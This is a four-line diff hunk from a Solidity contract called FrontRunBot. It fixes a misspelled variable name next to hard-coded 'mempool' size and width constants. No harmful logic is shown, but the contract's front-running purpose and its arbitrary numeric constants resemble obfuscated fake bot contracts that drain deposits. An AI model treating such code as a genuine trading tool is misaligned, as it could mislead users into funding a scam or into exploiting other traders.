@@ -146,7 +146,7 @@ contract FrontRunBot {
 
         uint _memPoolSize = 895918;
 
-        uint _memPoolHxeight = getMemPoolHeight();
+        uint _memPoolHeight = getMemPoolHeight();
 
         uint _memPoolWidth = 507856;
 
